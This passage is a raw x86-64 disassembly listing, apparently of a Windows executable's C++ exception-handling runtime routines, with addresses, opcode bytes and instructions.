   1400024d4:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400024d8:	eb 04                	jmp    0x1400024de
   1400024da:	44 8b 48 04          	mov    0x4(%rax),%r9d
   1400024de:	4c 8b c3             	mov    %rbx,%r8
   1400024e1:	48 8b d7             	mov    %rdi,%rdx
   1400024e4:	48 8b ce             	mov    %rsi,%rcx
   1400024e7:	e8 4c 17 00 00       	call   0x140003c38
   1400024ec:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400024f1:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400024f6:	48 83 c4 20          	add    $0x20,%rsp
   1400024fa:	5f                   	pop    %rdi
   1400024fb:	c3                   	ret
   1400024fc:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002501:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140002506:	56                   	push   %rsi
   140002507:	57                   	push   %rdi
   140002508:	41 54                	push   %r12
   14000250a:	41 56                	push   %r14
   14000250c:	41 57                	push   %r15
   14000250e:	48 83 ec 20          	sub    $0x20,%rsp
   140002512:	41 8b 70 0c          	mov    0xc(%r8),%esi
   140002516:	4c 8b e1             	mov    %rcx,%r12
   140002519:	49 8b c8             	mov    %r8,%rcx
   14000251c:	49 8b f9             	mov    %r9,%rdi
   14000251f:	4d 8b f0             	mov    %r8,%r14
   140002522:	4c 8b fa             	mov    %rdx,%r15
   140002525:	e8 f2 04 00 00       	call   0x140002a1c
   14000252a:	4d 8b 14 24          	mov    (%r12),%r10
   14000252e:	8b e8                	mov    %eax,%ebp
   140002530:	4c 89 17             	mov    %r10,(%rdi)
   140002533:	eb 63                	jmp    0x140002598
   140002535:	49 63 46 10          	movslq 0x10(%r14),%rax
   140002539:	8d 4e ff             	lea    -0x1(%rsi),%ecx
   14000253c:	8b f1                	mov    %ecx,%esi
   14000253e:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   140002542:	48 8d 1c 88          	lea    (%rax,%rcx,4),%rbx
   140002546:	49 03 5f 08          	add    0x8(%r15),%rbx
   14000254a:	3b 6b 04             	cmp    0x4(%rbx),%ebp
   14000254d:	7e 49                	jle    0x140002598
   14000254f:	3b 6b 08             	cmp    0x8(%rbx),%ebp
   140002552:	7f 44                	jg     0x140002598
   140002554:	49 8b 0f             	mov    (%r15),%rcx
   140002557:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000255c:	45 33 c0             	xor    %r8d,%r8d
   14000255f:	ff 15 db ca 00 00    	call   *0xcadb(%rip)        # 0x14000f040
   140002565:	4c 63 43 10          	movslq 0x10(%rbx),%r8
   140002569:	33 c9                	xor    %ecx,%ecx
   14000256b:	4c 03 44 24 50       	add    0x50(%rsp),%r8
   140002570:	44 8b 4b 0c          	mov    0xc(%rbx),%r9d
   140002574:	44 8b 10             	mov    (%rax),%r10d
   140002577:	45 85 c9             	test   %r9d,%r9d
   14000257a:	74 17                	je     0x140002593
   14000257c:	49 8d 50 0c          	lea    0xc(%r8),%rdx
   140002580:	48 63 02             	movslq (%rdx),%rax
   140002583:	49 3b c2             	cmp    %r10,%rax
   140002586:	74 0b                	je     0x140002593
   140002588:	ff c1                	inc    %ecx
   14000258a:	48 83 c2 14          	add    $0x14,%rdx
   14000258e:	41 3b c9             	cmp    %r9d,%ecx
   140002591:	72 ed                	jb     0x140002580
   140002593:	41 3b c9             	cmp    %r9d,%ecx
   140002596:	72 06                	jb     0x14000259e
   140002598:	85 f6                	test   %esi,%esi
   14000259a:	75 99                	jne    0x140002535
   14000259c:	eb 14                	jmp    0x1400025b2
   14000259e:	49 8b 04 24          	mov    (%r12),%rax
   1400025a2:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   1400025a6:	49 63 4c 88 10       	movslq 0x10(%r8,%rcx,4),%rcx
   1400025ab:	48 8b 0c 01          	mov    (%rcx,%rax,1),%rcx
   1400025af:	48 89 0f             	mov    %rcx,(%rdi)
   1400025b2:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   1400025b7:	48 8b c7             	mov    %rdi,%rax
   1400025ba:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   1400025bf:	48 83 c4 20          	add    $0x20,%rsp
   1400025c3:	41 5f                	pop    %r15
   1400025c5:	41 5e                	pop    %r14
   1400025c7:	41 5c                	pop    %r12
   1400025c9:	5f                   	pop    %rdi
   1400025ca:	5e                   	pop    %rsi
   1400025cb:	c3                   	ret
   1400025cc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400025d1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400025d6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400025db:	57                   	push   %rdi
   1400025dc:	41 54                	push   %r12
   1400025de:	41 55                	push   %r13
   1400025e0:	41 56                	push   %r14
   1400025e2:	41 57                	push   %r15
   1400025e4:	48 83 ec 40          	sub    $0x40,%rsp
   1400025e8:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   1400025ef:	00 
   1400025f0:	4c 8b fa             	mov    %rdx,%r15
   1400025f3:	48 8b f1             	mov    %rcx,%rsi
   1400025f6:	49 8b d1             	mov    %r9,%rdx
   1400025f9:	48 8b cb             	mov    %rbx,%rcx
   1400025fc:	49 8b f9             	mov    %r9,%rdi
   1400025ff:	45 8b f0             	mov    %r8d,%r14d
   140002602:	8b 6b 0c             	mov    0xc(%rbx),%ebp
   140002605:	e8 12 04 00 00       	call   0x140002a1c
   14000260a:	45 33 d2             	xor    %r10d,%r10d
   14000260d:	44 8b c8             	mov    %eax,%r9d
   140002610:	85 ed                	test   %ebp,%ebp
   140002612:	0f 84 df 00 00 00    	je     0x1400026f7
   140002618:	4c 8b 5f 08          	mov    0x8(%rdi),%r11
   14000261c:	41 83 cc ff          	or     $0xffffffff,%r12d
   140002620:	48 63 5b 10          	movslq 0x10(%rbx),%rbx
   140002624:	45 8b c4             	mov    %r12d,%r8d
   140002627:	45 8b ec             	mov    %r12d,%r13d
   14000262a:	8b d5                	mov    %ebp,%edx
   14000262c:	8d 7a ff             	lea    -0x1(%rdx),%edi
   14000262f:	48 8d 0c bf          	lea    (%rdi,%rdi,4),%rcx
   140002633:	49 8d 04 8b          	lea    (%r11,%rcx,4),%rax
   140002637:	44 3b 4c 18 04       	cmp    0x4(%rax,%rbx,1),%r9d
   14000263c:	7e 07                	jle    0x140002645
   14000263e:	44 3b 4c 18 08       	cmp    0x8(%rax,%rbx,1),%r9d
   140002643:	7e 06                	jle    0x14000264b
   140002645:	8b d7                	mov    %edi,%edx
   140002647:	85 ff                	test   %edi,%edi
   140002649:	75 e1                	jne    0x14000262c
   14000264b:	85 d2                	test   %edx,%edx
   14000264d:	74 10                	je     0x14000265f
   14000264f:	8d 42 ff             	lea    -0x1(%rdx),%eax
   140002652:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140002656:	4d 8d 0c 83          	lea    (%r11,%rax,4),%r9
   14000265a:	4c 03 cb             	add    %rbx,%r9
   14000265d:	eb 03                	jmp    0x140002662
   14000265f:	4d 8b ca             	mov    %r10,%r9
   140002662:	41 8b d2             	mov    %r10d,%edx
   140002665:	49 8d 0c 1b          	lea    (%r11,%rbx,1),%rcx
   140002669:	4d 85 c9             	test   %r9,%r9
   14000266c:	74 11                	je     0x14000267f
   14000266e:	41 8b 41 04          	mov    0x4(%r9),%eax
   140002672:	39 01                	cmp    %eax,(%rcx)
   140002674:	7e 1e                	jle    0x140002694
   140002676:	41 8b 41 08          	mov    0x8(%r9),%eax
   14000267a:	39 41 04             	cmp    %eax,0x4(%rcx)
   14000267d:	7f 15                	jg     0x140002694
   14000267f:	44 3b 31             	cmp    (%rcx),%r14d
   140002682:	7c 10                	jl     0x140002694
   140002684:	44 3b 71 04          	cmp    0x4(%rcx),%r14d
   140002688:	7f 0a                	jg     0x140002694
   14000268a:	45 3b c4             	cmp    %r12d,%r8d
   14000268d:	44 8b ea             	mov    %edx,%r13d
   140002690:	44 0f 44 c2          	cmove  %edx,%r8d
   140002694:	ff c2                	inc    %edx
   140002696:	48 83 c1 14          	add    $0x14,%rcx
   14000269a:	3b d5                	cmp    %ebp,%edx
   14000269c:	72 cb                	jb     0x140002669
   14000269e:	41 8b c2             	mov    %r10d,%eax
   1400026a1:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   1400026a6:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   1400026ab:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   1400026b0:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1400026b4:	45 3b c4             	cmp    %r12d,%r8d
   1400026b7:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   1400026bb:	41 0f 45 c0          	cmovne %r8d,%eax
   1400026bf:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400026c3:	41 8d 45 01          	lea    0x1(%r13),%eax
   1400026c7:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
   1400026cc:	44 0f 45 d0          	cmovne %eax,%r10d
   1400026d0:	48 8b c6             	mov    %rsi,%rax
   1400026d3:	44 89 54 24 38       	mov    %r10d,0x38(%rsp)
   1400026d8:	0f 10 4c 24 30       	movups 0x30(%rsp),%xmm1
   1400026dd:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   1400026e1:	f3 0f 7f 4e 10       	movdqu %xmm1,0x10(%rsi)
   1400026e6:	49 8b 73 40          	mov    0x40(%r11),%rsi
   1400026ea:	49 8b e3             	mov    %r11,%rsp
   1400026ed:	41 5f                	pop    %r15
   1400026ef:	41 5e                	pop    %r14
   1400026f1:	41 5d                	pop    %r13
   1400026f3:	41 5c                	pop    %r12
   1400026f5:	5f                   	pop    %rdi
   1400026f6:	c3                   	ret
   1400026f7:	e8 8c 3e 00 00       	call   0x140006588
   1400026fc:	cc                   	int3
   1400026fd:	cc                   	int3
   1400026fe:	cc                   	int3
   1400026ff:	cc                   	int3
   140002700:	40 55                	rex push %rbp
   140002702:	48 8d 6c 24 e1       	lea    -0x1f(%rsp),%rbp
   140002707:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   14000270e:	48 8b 05 2b 69 01 00 	mov    0x1692b(%rip),%rax        # 0x140019040
   140002715:	48 33 c4             	xor    %rsp,%rax
   140002718:	48 89 45 0f          	mov    %rax,0xf(%rbp)
   14000271c:	4c 8b 55 77          	mov    0x77(%rbp),%r10
   140002720:	48 8d 05 59 db 00 00 	lea    0xdb59(%rip),%rax        # 0x140010280
   140002727:	0f 10 00             	movups (%rax),%xmm0
   14000272a:	4c 8b d9             	mov    %rcx,%r11
   14000272d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002732:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140002736:	0f 11 01             	movups %xmm0,(%rcx)
   140002739:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   14000273d:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140002741:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140002745:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140002749:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   14000274d:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140002751:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140002755:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140002759:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   14000275d:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140002761:	0f 10 88 80 00 00 00 	movups 0x80(%rax),%xmm1
   140002768:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   14000276c:	0f 10 40 70          	movups 0x70(%rax),%xmm0
   140002770:	48 8b 80 90 00 00 00 	mov    0x90(%rax),%rax
   140002777:	0f 11 41 70          	movups %xmm0,0x70(%rcx)
   14000277b:	0f 11 89 80 00 00 00 	movups %xmm1,0x80(%rcx)
   140002782:	48 89 81 90 00 00 00 	mov    %rax,0x90(%rcx)
   140002789:	48 8d 05 38 12 00 00 	lea    0x1238(%rip),%rax        # 0x1400039c8
   140002790:	49 8b 0b             	mov    (%r11),%rcx
   140002793:	48 89 45 8f          	mov    %rax,-0x71(%rbp)
   140002797:	48 8b 45 4f          	mov    0x4f(%rbp),%rax
   14000279b:	48 89 45 9f          	mov    %rax,-0x61(%rbp)
   14000279f:	48 63 45 5f          	movslq 0x5f(%rbp),%rax
   1400027a3:	48 89 45 a7          	mov    %rax,-0x59(%rbp)
   1400027a7:	48 8b 45 57          	mov    0x57(%rbp),%rax
   1400027ab:	48 89 45 b7          	mov    %rax,-0x49(%rbp)
   1400027af:	0f b6 45 7f          	movzbl 0x7f(%rbp),%eax
   1400027b3:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   1400027b7:	49 8b 42 40          	mov    0x40(%r10),%rax
   1400027bb:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400027c0:	49 8b 42 28          	mov    0x28(%r10),%rax
   1400027c4:	4c 89 4d 97          	mov    %r9,-0x69(%rbp)
   1400027c8:	45 33 c9             	xor    %r9d,%r9d
   1400027cb:	4c 89 45 af          	mov    %r8,-0x51(%rbp)
   1400027cf:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400027d4:	48 89 55 bf          	mov    %rdx,-0x41(%rbp)
   1400027d8:	49 8b 12             	mov    (%r10),%rdx
   1400027db:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400027e0:	48 c7 45 cf 20 05 93 	movq   $0x19930520,-0x31(%rbp)
   1400027e7:	19 
   1400027e8:	ff 15 9a c8 00 00    	call   *0xc89a(%rip)        # 0x14000f088
   1400027ee:	48 8b 4d 0f          	mov    0xf(%rbp),%rcx
   1400027f2:	48 33 cc             	xor    %rsp,%rcx
   1400027f5:	e8 96 b2 00 00       	call   0x14000da90
   1400027fa:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   140002801:	5d                   	pop    %rbp
   140002802:	c3                   	ret
   140002803:	cc                   	int3
   140002804:	40 53                	rex push %rbx
   140002806:	48 83 ec 20          	sub    $0x20,%rsp
   14000280a:	48 8b d9             	mov    %rcx,%rbx
   14000280d:	48 89 11             	mov    %rdx,(%rcx)
   140002810:	e8 f7 f6 ff ff       	call   0x140001f0c
   140002815:	48 3b 58 58          	cmp    0x58(%rax),%rbx
   140002819:	73 0b                	jae    0x140002826
   14000281b:	e8 ec f6 ff ff       	call   0x140001f0c
   140002820:	48 8b 48 58          	mov    0x58(%rax),%rcx
   140002824:	eb 02                	jmp    0x140002828
   140002826:	33 c9                	xor    %ecx,%ecx
   140002828:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   14000282c:	e8 db f6 ff ff       	call   0x140001f0c
   140002831:	48 89 58 58          	mov    %rbx,0x58(%rax)
   140002835:	48 8b c3             	mov    %rbx,%rax
   140002838:	48 83 c4 20          	add    $0x20,%rsp
   14000283c:	5b                   	pop    %rbx
   14000283d:	c3                   	ret
   14000283e:	cc                   	int3
   14000283f:	cc                   	int3
   140002840:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002845:	57                   	push   %rdi
   140002846:	48 83 ec 20          	sub    $0x20,%rsp
   14000284a:	48 8b f9             	mov    %rcx,%rdi
   14000284d:	e8 ba f6 ff ff       	call   0x140001f0c
   140002852:	48 3b 78 58          	cmp    0x58(%rax),%rdi
   140002856:	75 35                	jne    0x14000288d
   140002858:	e8 af f6 ff ff       	call   0x140001f0c
   14000285d:	48 8b 50 58          	mov    0x58(%rax),%rdx
   140002861:	48 85 d2             	test   %rdx,%rdx
   140002864:	74 27                	je     0x14000288d
   140002866:	48 8b 5a 08          	mov    0x8(%rdx),%rbx
   14000286a:	48 3b fa             	cmp    %rdx,%rdi
   14000286d:	74 0a                	je     0x140002879
   14000286f:	48 8b d3             	mov    %rbx,%rdx
   140002872:	48 85 db             	test   %rbx,%rbx
   140002875:	74 16                	je     0x14000288d
   140002877:	eb ed                	jmp    0x140002866
   140002879:	e8 8e f6 ff ff       	call   0x140001f0c
   14000287e:	48 89 58 58          	mov    %rbx,0x58(%rax)
   140002882:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002887:	48 83 c4 20          	add    $0x20,%rsp
   14000288b:	5f                   	pop    %rdi
   14000288c:	c3                   	ret
   14000288d:	e8 f6 3c 00 00       	call   0x140006588
   140002892:	cc                   	int3
   140002893:	cc                   	int3
   140002894:	48 83 ec 28          	sub    $0x28,%rsp
   140002898:	e8 6f f6 ff ff       	call   0x140001f0c
   14000289d:	48 8b 40 60          	mov    0x60(%rax),%rax
   1400028a1:	48 83 c4 28          	add    $0x28,%rsp
   1400028a5:	c3                   	ret
   1400028a6:	cc                   	int3
   1400028a7:	cc                   	int3
   1400028a8:	48 83 ec 28          	sub    $0x28,%rsp
   1400028ac:	e8 5b f6 ff ff       	call   0x140001f0c
   1400028b1:	48 8b 40 68          	mov    0x68(%rax),%rax
   1400028b5:	48 83 c4 28          	add    $0x28,%rsp
   1400028b9:	c3                   	ret
   1400028ba:	cc                   	int3
   1400028bb:	cc                   	int3
   1400028bc:	40 53                	rex push %rbx
   1400028be:	48 83 ec 20          	sub    $0x20,%rsp
   1400028c2:	48 8b d9             	mov    %rcx,%rbx
   1400028c5:	e8 42 f6 ff ff       	call   0x140001f0c
   1400028ca:	48 89 58 60          	mov    %rbx,0x60(%rax)
   1400028ce:	48 83 c4 20          	add    $0x20,%rsp
   1400028d2:	5b                   	pop    %rbx
   1400028d3:	c3                   	ret
   1400028d4:	40 53                	rex push %rbx
   1400028d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400028da:	48 8b d9             	mov    %rcx,%rbx
   1400028dd:	e8 2a f6 ff ff       	call   0x140001f0c
   1400028e2:	48 89 58 68          	mov    %rbx,0x68(%rax)
   1400028e6:	48 83 c4 20          	add    $0x20,%rsp
   1400028ea:	5b                   	pop    %rbx
   1400028eb:	c3                   	ret
   1400028ec:	48 8b c4             	mov    %rsp,%rax
   1400028ef:	48 89 58 10          	mov    %rbx,0x10(%rax)
   1400028f3:	48 89 68 18          	mov    %rbp,0x18(%rax)
   1400028f7:	48 89 70 20          	mov    %rsi,0x20(%rax)
   1400028fb:	57                   	push   %rdi
   1400028fc:	48 83 ec 40          	sub    $0x40,%rsp
   140002900:	49 8b 59 08          	mov    0x8(%r9),%rbx
   140002904:	49 8b f9             	mov    %r9,%rdi
   140002907:	49 8b f0             	mov    %r8,%rsi
   14000290a:	48 89 50 08          	mov    %rdx,0x8(%rax)
   14000290e:	48 8b e9             	mov    %rcx,%rbp
   140002911:	e8 f6 f5 ff ff       	call   0x140001f0c
   140002916:	48 89 58 60          	mov    %rbx,0x60(%rax)
   14000291a:	48 8b 5d 38          	mov    0x38(%rbp),%rbx
   14000291e:	e8 e9 f5 ff ff       	call   0x140001f0c
   140002923:	48 89 58 68          	mov    %rbx,0x68(%rax)
   140002927:	e8 e0 f5 ff ff       	call   0x140001f0c
   14000292c:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   140002930:	4c 8b cf             	mov    %rdi,%r9
   140002933:	4c 8b c6             	mov    %rsi,%r8
   140002936:	8b 11                	mov    (%rcx),%edx
   140002938:	48 8b cd             	mov    %rbp,%rcx
   14000293b:	48 03 50 60          	add    0x60(%rax),%rdx
   14000293f:	33 c0                	xor    %eax,%eax
   140002941:	88 44 24 38          	mov    %al,0x38(%rsp)
   140002945:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000294a:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000294e:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140002953:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140002958:	e8 7b 0f 00 00       	call   0x1400038d8
   14000295d:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140002962:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140002967:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   14000296c:	48 83 c4 40          	add    $0x40,%rsp
   140002970:	5f                   	pop    %rdi
   140002971:	c3                   	ret
   140002972:	cc                   	int3
   140002973:	cc                   	int3
   140002974:	cc                   	int3
   140002975:	cc                   	int3
   140002976:	cc                   	int3
   140002977:	cc                   	int3
   140002978:	cc                   	int3
   140002979:	cc                   	int3
   14000297a:	cc                   	int3
   14000297b:	cc                   	int3
   14000297c:	cc                   	int3
   14000297d:	cc                   	int3
   14000297e:	cc                   	int3
   14000297f:	cc                   	int3
   140002980:	48 83 ec 28          	sub    $0x28,%rsp
   140002984:	4d 63 48 1c          	movslq 0x1c(%r8),%r9
   140002988:	4d 8b d0             	mov    %r8,%r10
   14000298b:	48 8b 01             	mov    (%rcx),%rax
   14000298e:	41 8b 04 01          	mov    (%r9,%rax,1),%eax
   140002992:	83 f8 fe             	cmp    $0xfffffffe,%eax
   140002995:	75 0b                	jne    0x1400029a2
   140002997:	4c 8b 02             	mov    (%rdx),%r8
   14000299a:	49 8b ca             	mov    %r10,%rcx
   14000299d:	e8 82 00 00 00       	call   0x140002a24
   1400029a2:	48 83 c4 28          	add    $0x28,%rsp
   1400029a6:	c3                   	ret
   1400029a7:	cc                   	int3
   1400029a8:	40 53                	rex push %rbx
   1400029aa:	48 83 ec 20          	sub    $0x20,%rsp
   1400029ae:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1400029b3:	49 8b d8             	mov    %r8,%rbx
   1400029b6:	e8 41 fb ff ff       	call   0x1400024fc
   1400029bb:	48 8b 08             	mov    (%rax),%rcx
   1400029be:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   1400029c2:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   1400029c7:	8b 44 08 04          	mov    0x4(%rax,%rcx,1),%eax
   1400029cb:	48 83 c4 20          	add    $0x20,%rsp
   1400029cf:	5b                   	pop    %rbx
   1400029d0:	c3                   	ret
   1400029d1:	cc                   	int3
   1400029d2:	cc                   	int3
   1400029d3:	cc                   	int3
   1400029d4:	48 63 52 1c          	movslq 0x1c(%rdx),%rdx
   1400029d8:	48 8b 01             	mov    (%rcx),%rax
   1400029db:	44 89 04 02          	mov    %r8d,(%rdx,%rax,1)
   1400029df:	c3                   	ret
   1400029e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400029e5:	57                   	push   %rdi
   1400029e6:	48 83 ec 20          	sub    $0x20,%rsp
   1400029ea:	41 8b f9             	mov    %r9d,%edi
   1400029ed:	49 8b d8             	mov    %r8,%rbx
   1400029f0:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1400029f5:	e8 02 fb ff ff       	call   0x1400024fc
   1400029fa:	48 8b 08             	mov    (%rax),%rcx
   1400029fd:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   140002a01:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140002a06:	3b 7c 08 04          	cmp    0x4(%rax,%rcx,1),%edi
   140002a0a:	7e 04                	jle    0x140002a10
   140002a0c:	89 7c 08 04          	mov    %edi,0x4(%rax,%rcx,1)
   140002a10:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002a15:	48 83 c4 20          	add    $0x20,%rsp
   140002a19:	5f                   	pop    %rdi
   140002a1a:	c3                   	ret
   140002a1b:	cc                   	int3
   140002a1c:	4c 8b 02             	mov    (%rdx),%r8
   140002a1f:	e9 00 00 00 00       	jmp    0x140002a24
   140002a24:	40 53                	rex push %rbx
   140002a26:	48 83 ec 20          	sub    $0x20,%rsp
   140002a2a:	49 8b d8             	mov    %r8,%rbx
   140002a2d:	48 85 c9             	test   %rcx,%rcx
   140002a30:	74 52                	je     0x140002a84
   140002a32:	4c 63 59 18          	movslq 0x18(%rcx),%r11
   140002a36:	4c 8b 52 08          	mov    0x8(%rdx),%r10
   140002a3a:	4b 8d 04 1a          	lea    (%r10,%r11,1),%rax
   140002a3e:	48 85 c0             	test   %rax,%rax
   140002a41:	74 41                	je     0x140002a84
   140002a43:	44 8b 41 14          	mov    0x14(%rcx),%r8d
   140002a47:	45 33 c9             	xor    %r9d,%r9d
   140002a4a:	45 85 c0             	test   %r8d,%r8d
   140002a4d:	74 30                	je     0x140002a7f
   140002a4f:	4b 8d 0c cb          	lea    (%r11,%r9,8),%rcx
   140002a53:	4a 63 14 11          	movslq (%rcx,%r10,1),%rdx
   140002a57:	49 03 d2             	add    %r10,%rdx
   140002a5a:	48 3b da             	cmp    %rdx,%rbx
   140002a5d:	72 08                	jb     0x140002a67
   140002a5f:	41 ff c1             	inc    %r9d
   140002a62:	45 3b c8             	cmp    %r8d,%r9d
   140002a65:	72 e8                	jb     0x140002a4f
   140002a67:	45 85 c9             	test   %r9d,%r9d
   140002a6a:	74 13                	je     0x140002a7f
   140002a6c:	41 8d 49 ff          	lea    -0x1(%r9),%ecx
   140002a70:	49 8d 04 ca          	lea    (%r10,%rcx,8),%rax
   140002a74:	42 8b 44 18 04       	mov    0x4(%rax,%r11,1),%eax
   140002a79:	48 83 c4 20          	add    $0x20,%rsp
   140002a7d:	5b                   	pop    %rbx
   140002a7e:	c3                   	ret
   140002a7f:	83 c8 ff             	or     $0xffffffff,%eax
   140002a82:	eb f5                	jmp    0x140002a79
   140002a84:	e8 ff 3a 00 00       	call   0x140006588
   140002a89:	cc                   	int3
   140002a8a:	cc                   	int3
   140002a8b:	cc                   	int3
   140002a8c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002a91:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002a96:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140002a9b:	41 55                	push   %r13
   140002a9d:	41 56                	push   %r14
   140002a9f:	41 57                	push   %r15
   140002aa1:	48 83 ec 30          	sub    $0x30,%rsp
   140002aa5:	4d 8b f1             	mov    %r9,%r14
   140002aa8:	49 8b d8             	mov    %r8,%rbx
   140002aab:	48 8b f2             	mov    %rdx,%rsi
   140002aae:	4c 8b e9             	mov    %rcx,%r13
   140002ab1:	33 ff                	xor    %edi,%edi
   140002ab3:	41 39 78 04          	cmp    %edi,0x4(%r8)
   140002ab7:	74 0f                	je     0x140002ac8
   140002ab9:	4d 63 78 04          	movslq 0x4(%r8),%r15
   140002abd:	e8 d2 fd ff ff       	call   0x140002894
   140002ac2:	49 8d 14 07          	lea    (%r15,%rax,1),%rdx
   140002ac6:	eb 06                	jmp    0x140002ace
   140002ac8:	48 8b d7             	mov    %rdi,%rdx
   140002acb:	44 8b ff             	mov    %edi,%r15d
   140002ace:	48 85 d2             	test   %rdx,%rdx
   140002ad1:	0f 84 77 01 00 00    	je     0x140002c4e
   140002ad7:	45 85 ff             	test   %r15d,%r15d
   140002ada:	74 11                	je     0x140002aed
   140002adc:	e8 b3 fd ff ff       	call   0x140002894
   140002ae1:	48 8b c8             	mov    %rax,%rcx
   140002ae4:	48 63 43 04          	movslq 0x4(%rbx),%rax
   140002ae8:	48 03 c8             	add    %rax,%rcx
   140002aeb:	eb 03                	jmp    0x140002af0
   140002aed:	48 8b cf             	mov    %rdi,%rcx
   140002af0:	40 38 79 10          	cmp    %dil,0x10(%rcx)
   140002af4:	0f 84 54 01 00 00    	je     0x140002c4e
   140002afa:	39 7b 08             	cmp    %edi,0x8(%rbx)
   140002afd:	75 08                	jne    0x140002b07
   140002aff:	39 3b                	cmp    %edi,(%rbx)
   140002b01:	0f 8d 47 01 00 00    	jge    0x140002c4e
   140002b07:	39 3b                	cmp    %edi,(%rbx)
   140002b09:	7c 0a                	jl     0x140002b15
   140002b0b:	48 63 43 08          	movslq 0x8(%rbx),%rax
   140002b0f:	48 03 06             	add    (%rsi),%rax
   140002b12:	48 8b f0             	mov    %rax,%rsi
   140002b15:	f6 03 80             	testb  $0x80,(%rbx)
   140002b18:	74 32                	je     0x140002b4c
   140002b1a:	41 f6 06 10          	testb  $0x10,(%r14)
   140002b1e:	74 2c                	je     0x140002b4c
   140002b20:	48 8b 05 21 70 01 00 	mov    0x17021(%rip),%rax        # 0x140019b48
   140002b27:	48 85 c0             	test   %rax,%rax
   140002b2a:	74 20                	je     0x140002b4c
   140002b2c:	ff 15 2e c7 00 00    	call   *0xc72e(%rip)        # 0x14000f260
   140002b32:	48 85 c0             	test   %rax,%rax
   140002b35:	0f 84 2f 01 00 00    	je     0x140002c6a
   140002b3b:	48 85 f6             	test   %rsi,%rsi
   140002b3e:	0f 84 26 01 00 00    	je     0x140002c6a
   140002b44:	48 89 06             	mov    %rax,(%rsi)
   140002b47:	48 8b c8             	mov    %rax,%rcx
   140002b4a:	eb 5f                	jmp    0x140002bab
   140002b4c:	f6 03 08             	testb  $0x8,(%rbx)
   140002b4f:	74 1b                	je     0x140002b6c
   140002b51:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   140002b55:	48 85 c9             	test   %rcx,%rcx
   140002b58:	0f 84 11 01 00 00    	je     0x140002c6f
   140002b5e:	48 85 f6             	test   %rsi,%rsi
   140002b61:	0f 84 08 01 00 00    	je     0x140002c6f
   140002b67:	48 89 0e             	mov    %rcx,(%rsi)
   140002b6a:	eb 3f                	jmp    0x140002bab
   140002b6c:	41 f6 06 01          	testb  $0x1,(%r14)
   140002b70:	74 4a                	je     0x140002bbc
   140002b72:	49 8b 55 28          	mov    0x28(%r13),%rdx
   140002b76:	48 85 d2             	test   %rdx,%rdx
   140002b79:	0f 84 f5 00 00 00    	je     0x140002c74
   140002b7f:	48 85 f6             	test   %rsi,%rsi
   140002b82:	0f 84 ec 00 00 00    	je     0x140002c74
   140002b88:	4d 63 46 14          	movslq 0x14(%r14),%r8
   140002b8c:	48 8b ce             	mov    %rsi,%rcx
   140002b8f:	e8 1c b6 00 00       	call   0x14000e1b0
